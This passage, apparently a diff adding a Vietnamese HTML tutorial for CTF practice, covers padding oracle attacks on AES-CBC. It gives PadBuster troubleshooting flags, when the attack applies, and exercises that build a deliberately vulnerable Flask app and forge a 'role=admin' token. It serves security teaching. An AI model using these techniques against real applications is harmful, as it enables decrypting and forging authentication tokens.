+    <tr><td>PadBuster báo "No Errors were detected... unable to determine padding fail"</td><td>App không trả response khác biệt rõ ràng, hoặc khác biệt không nằm ở độ dài/status mà PadBuster tự nhận diện</td><td>Thêm tham số <code>-error "chuỗi lỗi cụ thể"</code> để chỉ rõ dấu hiệu lỗi, xác định thủ công bằng Burp trước (mục 05)</td></tr>
+    <tr><td>Kết quả giải mã ra toàn ký tự rác</td><td>Sai thứ tự IV — token có thể gồm IV + ciphertext ghép lại, cần tách đúng khối đầu làm IV</td><td>Kiểm tra độ dài token: nếu là (N+1)×16, khối đầu thường là IV — bỏ tham số <code>-noiv</code> hoặc chỉ định đúng</td></tr>
+    <tr><td>Encoding sai, PadBuster lỗi decode ngay từ đầu</td><td>Nhầm giữa hex thường, hex-upper, base64, base64 URL-safe</td><td>Thử lần lượt các giá trị <code>-encoding 0/1/2/3/4</code> theo tài liệu PadBuster</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App dùng AES-CBC tự chế (không qua JWT/thư viện chuẩn có HMAC), VÀ có thể quan sát được response khác biệt rõ rệt giữa padding sai/đúng.</td></tr>
+    <tr><td>❌</td><td>App dùng AES-GCM hoặc có thêm lớp HMAC xác thực trước khi giải mã (sẽ báo lỗi "invalid MAC" ngay từ đầu, không bao giờ chạm tới bước kiểm tra padding) — không có oracle.</td></tr>
+    <tr><td>❌</td><td>Response hoàn toàn giống nhau (cùng status, cùng nội dung, cùng thời gian) cho mọi loại lỗi giải mã — không có oracle nào để lợi dụng dù code có lỗ hổng cấu trúc.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 Flask app nhỏ mã hoá <code>"role=user"</code> bằng AES-CBC, cố ý trả lỗi
+  khác nhau giữa padding sai/đúng, tự chạy PadBuster để giải mã ra lại <code>"role=user"</code>.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng thư viện <code>pycryptodome</code>, nhớ bắt riêng
+  exception <code>ValueError("Padding is incorrect")</code> và trả status code khác (vd 400) so với lỗi khác
+  (500).</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> dùng <code>-plaintext</code> của PadBuster để tự mã hoá
+  <code>"role=admin"</code>, xác nhận token mới giải mã đúng ở phía server (viết route kiểm tra riêng để test).</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Độ dài plaintext mới phải khác độ dài cũ không sao — PadBuster tự xử
+  lý padding cho độ dài bất kỳ, miễn cùng block size.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app chuyển từ trả lỗi khác biệt (dễ bị lợi dụng) sang LUÔN trả cùng 1 lỗi
+  chung — nhưng thời gian xử lý (response time) vẫn khác nhau nhỏ giữa 2 trường hợp (vì code kiểm tra padding
+  tốn thêm vài micro-giây). Giải thích đây là loại oracle gì, và vì sao khó khai thác hơn nhiều so với oracle
+  dựa trên nội dung response.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Đây là <strong>timing oracle</strong> — cần đo thời gian response
+  rất chính xác qua mạng (độ trễ mạng thường lớn hơn chênh lệch cần đo), phải gửi RẤT NHIỀU request lặp lại lấy
+  trung bình mới phân biệt được — thực tế hiếm khi khai thác được qua Internet/LAN thi đấu thông thường.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Oracle</td><td>Bất kỳ cơ chế trả lời đúng/sai mà kẻ tấn công lợi dụng để dò thông tin bí mật.</td></tr>
+    <tr><td>CBC (Cipher Block Chaining)</td><td>Chế độ mã hoá nối khối, khối trước ảnh hưởng (XOR) tới kết quả giải mã khối sau.</td></tr>
+    <tr><td>PKCS#7 padding</td><td>Quy tắc đệm: N byte đệm cuối đều phải có giá trị bằng N.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ offline:</strong> <code>~/hoc/CTF/Tools/web/padbuster/</code> (cần Perl,
+  thường có sẵn trên hầu hết Linux).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("padoracle-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("padoracle-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
